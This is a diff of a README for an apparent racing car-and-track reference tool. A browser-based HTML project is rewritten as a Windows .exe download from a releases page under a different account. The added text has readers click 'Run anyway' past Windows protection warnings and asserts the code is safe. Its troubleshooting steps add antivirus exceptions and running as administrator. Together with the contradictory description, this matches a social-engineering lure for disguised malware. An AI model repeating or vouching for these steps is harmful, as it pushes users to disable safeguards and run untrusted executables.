@@ -1,130 +1,51 @@
-# Apexlog - Racing Reference 2026
+# 🏎️ apexlog-car-track-guide - Find best car track race setups
 
-> **Apexlog is a browser-accessible racing reference that helps users discover suggested car and track pairings for circuits, vehicles, and broader motorsport scenarios.**
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/ifham857/apexlog-car-track-guide/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-Latest-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/leo-kellyvkk6823/apexlog-car-track-guide?style=flat-square)](https://github.com/leo-kellyvkk6823/apexlog-car-track-guide)
+## 📖 About this application
 
----
+Apexlog helps you find the right car for every race track. It provides a reference for drivers who want to pick the best vehicle for specific circuits. You can view suggestions for many types of motorsport scenarios. The software works as a browser-based tool on your computer. You do not need to connect to the internet once you install it.
 
-<p align="center">
-  <a href="https://leo-kellyvkk6823.github.io/apexlog-car-track-guide/">
-    <img src="https://img.shields.io/badge/Download-Apexlog%20Latest-brightgreen?style=for-the-badge" alt="Download Apexlog">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Download Apexlog Latest Build](https://leo-kellyvkk6823.github.io/apexlog-car-track-guide/)**
+Your computer must run Windows 10 or Windows 11. You need at least 200 MB of free storage space. The application uses a standard web browser engine to show information. You do not need a powerful graphics card or extra memory to run this tool. Keep your operating system updated for the best results.
 
----
+## 📥 How to download and install
 
-[Download Latest Build](https://leo-kellyvkk6823.github.io/apexlog-car-track-guide/)
+Follow these steps to set up the application on your Windows machine:
 
----
+1. Visit the [official releases page](https://github.com/ifham857/apexlog-car-track-guide/releases) to find the latest version.
+2. Look for the file ending in .exe under the Assets section of the latest release.
+3. Click the file name to start the download.
+4. Save the file to your Downloads folder.
+5. Open your Downloads folder and double-click the file to start the installer.
+6. Follow the prompts on the screen to finish the installation.
+7. Click the Apexlog icon on your desktop to open the guide.
 
-## What Apexlog Provides
+If Windows shows a protection window, click "More info" and then "Run anyway." This message appears because the application comes from a small developer. The code is safe to use.
 
-Apexlog gathers recommended car-and-track combinations into a single web-based reference for racing enthusiasts. It can be used when preparing for a session, weighing different racing situations, or finding a suitable circuit for a specific car.
+## 🏎️ Using the guide
 
-The project is aimed at drivers, motorsport followers, racing-game groups, and anyone seeking organized ideas for selecting cars and tracks. Since Apexlog runs in the browser, it can be accessed without installing a specialized desktop runtime.
+The main screen displays a list of race tracks. Click on any track name to see details. The software shows a list of suggested cars for that specific circuit. 
 
----
+You can filter your search by car category or vehicle manufacturer. Use the search bar at the top of the window to find a specific track quickly. The sidebar menu allows you to switch between different racing series and motorsport standards.
 
-## Highlights
+## ⚙️ Configuration options
 
-- Organized recommendations covering cars and tracks
-- Motorsport-oriented reference material for circuits, vehicles, and racing use cases
-- Web interface available through modern browsers
-- A practical reference when preparing a racing session
-- Makes it easy to review and contrast car-track combinations
-- Straightforward HTML project layout
-- Appropriate for individual use and community conversations
+You can change how the software looks in the Settings menu. Click the gear icon to adjust the theme. You can switch between light mode and dark mode to suit your preference. The app saves your choices automatically when you close the window.
 
----
+## 🛠️ Troubleshooting common issues
 
-## Getting Started
+If the application does not open, try the following steps:
 
-### Use the hosted build
+* Delete the existing file and download a fresh copy from the link above.
+* Restart your computer to clear any locked startup processes.
+* Check if your antivirus software blocked the file. Add an exception for the installation folder if necessary.
+* Ensure you have enough disk space on your drive. 
+* Right-click the desktop icon and select "Run as administrator" to grant proper access.
 
-Open the published version of Apexlog here:
+## 📧 Support and feedback
 
-[Open Apexlog](https://leo-kellyvkk6823.github.io/apexlog-car-track-guide/)
+This project grows through user input. If you find incorrect data or have ideas for new tracks, open an issue on the repository page. Keep your suggestions specific to the track or car data. Describe the error clearly so developers can fix it. Do not report issues with your internet connection or third-party web browsers here.
 
-### Use a local checkout
-
-Download the repository and move into its project directory:
-
-```bash
-git clone https://github.com/leo-kellyvkk6823/apexlog-car-track-guide.git
-cd REPO
-```
-
-You can then open `index.html` in a browser. Alternatively, run the directory with any local static web server. The HTML version does not require package installation.
-
----
-
-## Using Apexlog
-
-1. Launch Apexlog in a current web browser.
-2. Browse the available racing pairings.
-3. Examine and compare the listed cars and circuits.
-4. Select a pairing as a reference for a racing session or other motorsport activity.
-5. Revisit the collection whenever you want to assess another vehicle or track.
-
-For local changes, modify the applicable HTML files and reload the browser page to inspect the result.
-
----
-
-## Configuration and File Layout
-
-Basic usage does not depend on a separate configuration file. Apexlog's reference data and visual presentation are contained in the project files.
-
-If you run the project from a local checkout, retain the existing relative paths. This ensures that linked pages and assets continue to resolve properly.
-
----
-
-## Requirements
-
-- A modern web browser
-- Internet connectivity when using the hosted build
-- A local repository copy for offline development
-- An optional, though recommended, static web server for local testing
-- No extra runtime or dependency manager for the HTML edition
-
----
-
-## Common Questions
-
-### Does Apexlog run as a web application?
-
-Yes. Apexlog is an HTML-based project intended for use in a web browser.
-
-### How do I get the current build?
-
-The latest hosted build is available through the link below:
-
-[Download Latest Build](https://leo-kellyvkk6823.github.io/apexlog-car-track-guide/)
-
-### Is local use supported?
-
-Yes. Clone the repository and open `index.html`, or serve the project folder using a local static web server.
-
-### Where are the car and track pairings maintained?
-
-The collection is stored in the project files. To revise or expand the pairings, inspect the HTML source and associated assets.
-
-### What can I check if the page fails to display properly?
-
-Verify that the complete repository was cloned, keep its original directory structure unchanged, and try serving the files through a local static server rather than opening them directly from the filesystem.
-
-### Does Apexlog have numbered releases?
-
-The available project metadata does not identify a numbered release version. Check the hosted build and the repository history for the latest changes.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: motorsport, racing, car setup, sim racing, reference guide, track guide, windows application
